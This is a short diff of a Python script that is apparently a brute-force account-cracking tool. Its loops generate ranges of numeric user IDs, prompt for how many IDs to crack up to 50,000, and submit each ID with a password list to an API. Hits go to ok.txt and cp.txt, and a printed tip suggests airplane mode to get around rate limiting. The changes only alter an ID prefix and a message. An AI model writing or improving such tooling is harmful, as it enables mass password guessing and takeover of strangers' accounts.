@@ -437,7 +437,7 @@ class Main:
 	def old(self):
 		x = 111111111
 		xx = 999999999
-		idx = "1000" 
+		idx = "10000" 
 		os.system('clear');print(logo)
 		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
@@ -457,7 +457,7 @@ class Main:
 				print(logo)
 				print("\n%s [+] OK ID SAVED IN -> ok.txt"%(Y))
 				print("%s [+] CP ID SAVED IN -> cp.txt"%(G))
-				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
+				print("%s [!] IF NO RESULT USE AIRPLANE MODE FEW SECONDS\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n [>>] CRACK COMPLETE BRO......")
@@ -864,7 +864,7 @@ class Main:
 	def old2(self):
 		x = 1111111111
 		xx = 9999999999
-		idx = "10000" 
+		idx = "1000" 
 		os.system('clear');print(logo)
 		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
